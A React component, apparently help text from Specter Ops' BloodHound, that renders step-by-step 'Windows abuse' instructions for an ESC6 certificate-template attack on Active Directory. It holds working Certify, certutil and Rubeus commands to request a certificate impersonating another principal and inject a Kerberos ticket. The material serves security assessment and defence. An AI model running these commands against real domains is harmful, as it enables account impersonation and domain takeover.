// Copyright 2024 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Typography } from '@mui/material';
import { FC } from 'react';

const WindowsAbuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
            <Typography variant='body2'>
                <b>Step 1</b>: Use Certify to request enrollment in the affected template, specifying the affected
                enterprise CA and target principal to impersonate:
            </Typography>
            <Typography component={'pre'}>
                {
                    '.\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:<target UPN or SAMAccountName without $> /url:"tag:microsoft.com,2022-09-14:sid:<target SID>"'
                }
            </Typography>
            <Typography variant='body2'>
                If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
                cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does
                not have their 'mail' or 'dNSHostName' attribute set, which is required by the certificate template. The
                'mail' attribute can be set on both user and computer objects but the 'dNSHostName' attribute can only
                be set on computer objects. Computers have validated write permission to their own 'dNSHostName'
                attribute by default, but neither users nor computers can write to their own 'mail' attribute by
                default.
            </Typography>
            <Typography variant='body2'>
                <b>Step 2</b>: Convert the emitted certificate to PFX format:
            </Typography>
            <Typography component={'pre'}>{'certutil.exe -MergePFX .cert.pem .cert.pfx'}</Typography>
            <Typography variant='body2'>
                <b>Step 3</b>: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the
                target identity to impersonate and the PFX-formatted certificate created in Step 2:
            </Typography>
            <Typography component={'pre'}>
                {
                    '.\\Rubeus.exe asktgt /certificate:cert.pfx /user:forestrootda /domain:forestroot.com /password:asdf /ptt'
                }
            </Typography>
            <Typography variant='body2'>
                <b>Step 4</b>: Optionally verify the TGT by listing it with the klist command:
            </Typography>
            <Typography component={'pre'}>{'klist'}</Typography>
        </>
    );
};

export default WindowsAbuse;
